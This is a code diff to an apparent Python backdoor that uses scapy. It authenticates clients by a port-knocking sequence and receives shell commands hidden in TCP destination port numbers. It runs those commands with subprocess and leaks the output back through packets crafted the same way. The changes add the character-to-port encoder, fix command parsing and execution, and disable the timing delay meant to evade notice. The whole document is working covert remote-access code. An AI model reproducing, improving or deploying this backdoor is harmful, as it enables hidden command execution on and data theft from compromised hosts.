@@ -6,6 +6,7 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from subprocess import *
+from random import randint
 from Crypto.Cipher import AES
 CONN_IPS = collections.defaultdict(list)
 CMDS = collections.defaultdict(list)
@@ -31,20 +32,28 @@ def verify_root():
 		exit("This program must be run with root/sudo")
 
 
+def char_packet(dest, char1, char2=None):
+    if(char2 is None):
+        destport = ord(char1) << 8
+    else:
+        destport = (ord(char1) << 8) + ord(char2)
+    return IP(dst=dest) / TCP(sport=80, dport=destport)
+
+
 def end_msg(dest):
 	randPort = randint(1500, 65535)
-	packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=get_srcport())
+	packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=80)
 	send(packet)
 
 
 def send_msg(msg, ip):
     for char1, char2 in zip(msg[0::2], msg[1::2]):
-        delay_sleep()
-        send(char_packet(args.destIP, char1, char2))
+        # delay_sleep()
+        send(char_packet(ip, char1, char2))
     if(len(msg) % 2):
-        delay_sleep()
-        send(char_packet(args.destIP, msg[len(msg) - 1]))
-    end_msg(args.destIP)
+        # delay_sleep()
+        send(char_packet(ip, msg[len(msg) - 1]))
+    end_msg(ip)
 
 
 def run_cmd(packet, cmd):
@@ -52,14 +61,14 @@ def run_cmd(packet, cmd):
 	try:
 		command, arguments = cmd.split(' ', 1)
 	except ValueError:
-		command = cmd[0]
+		command = cmd.rstrip('\0')
 		arguments = None
 	print("Running command: {} {}".format(command, arguments))
 	try:
 		if(arguments is not None):
 			out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
 		else:
-			out, err = Popen(data, stdout=PIPE, stderr=PIPE).communicate()
+			out, err = Popen(command, stdout=PIPE, stderr=PIPE).communicate()
 	except OSError:
 		output = "Invalid Command / Command not found"
 	if(out):
@@ -82,10 +91,12 @@ def execute(packet, command):
 
 
 def decode(packet):
+	global CMDS
 	ip = packet[1].src
 	if(packet[1].id == 42424):
 		execute(packet, ''.join(CMDS[ip]))
 		CMDS[ip] = ""
+		return
 	dport = packet[2].dport
 	char1 = chr((dport >> 8) & 0xff)
 	char2 = chr(dport & 0xff)
@@ -93,12 +104,14 @@ def decode(packet):
 		CMDS[ip] += "{}{}".format(char1, char2)
 	else:
 		CMDS[ip] += "{}".format(char1)
+	print("ran decode: {}".format(CMDS[ip]))
 
 
 def port_knock_auth(packet):
 	global CONN_IPS
 	ip = packet[1].src
 	dport = packet[2].dport
+	sport = packet[2].sport
 	access = [2525, 14156, 6364]
 	dc = 4242
 
@@ -111,7 +124,9 @@ def port_knock_auth(packet):
 				del CONN_IPS[ip]
 				print("{} has disconnected".format(ip))
 				return
-			decode(packet)
+			if(sport == 80):
+				decode(packet)
+				return
 		elif(dport not in access):
 			del CONN_IPS[ip]
 		# Connecting IP matches second knock
